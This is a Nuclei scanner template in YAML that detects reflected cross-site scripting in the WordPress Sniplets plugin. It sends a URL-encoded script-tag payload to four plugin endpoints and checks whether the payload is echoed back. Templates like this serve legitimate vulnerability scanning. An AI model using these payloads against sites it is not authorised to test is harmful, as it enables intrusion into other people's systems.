id: wp-sniplets-xss

info:
  name: Wordpress Plugin Sniplets - XSS
  author: dhiyaneshDK
  severity: medium
  description: Cross-site scripting (XSS) on Wordpress Plugin Sniplets
  reference: https://www.exploit-db.com/exploits/5194
  tags: xss,wordpress,plugin

requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%22%3E%3Cscript%3Ealert(%22document.domain%22)%3C/script%3E'
      - '{{BaseURL}}/wp-content/plugins/sniplets/view/sniplets/notice.php?text=%22%3E%3Cscript%3Ealert(%22document.domain%22)%3C/script%3E'
      - '{{BaseURL}}/wp-content/plugins/sniplets/view/sniplets/inset.php?text=%22%3E%3Cscript%3Ealert(%22document.domain%22)%3C/script%3E'
      - '{{BaseURL}}/wp-content/plugins/sniplets/view/admin/submenu.php?url=%22%3E%3Cscript%3Ealert(%22document.domain%22)%3C/script%3E'

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "><script>alert("document.domain")</script>"
        part: body

      - type: word
        words:
          - "text/html"
        part: header
